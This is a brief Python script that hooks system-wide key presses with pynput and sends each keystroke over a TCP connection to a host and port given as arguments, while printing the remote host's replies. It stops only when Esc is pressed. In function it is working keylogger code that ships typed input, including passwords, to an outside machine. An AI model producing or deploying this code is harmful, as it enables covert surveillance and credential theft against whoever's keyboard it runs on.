import socket
import sys

from pynput.keyboard import Key, Listener


def key_press(key):
    global closed
    if key == Key.esc:
        closed = True
        s.close()
    elif not closed:
        k = str(key)
        k = k.replace("'", "")
        s.sendall(bytes(k, "ascii"))
def main():
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    global closed, s
    closed = True
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    global closed
    closed = False
    listener = Listener(on_press=key_press)
    listener.start()
    while not closed:
        try:
            data = s.recv(1024)
            print(data.decode("ASCII"))
            if len(data) == 0:
                break
        except Exception as e:
            print(e)

if __name__ == "__main__":
    main()
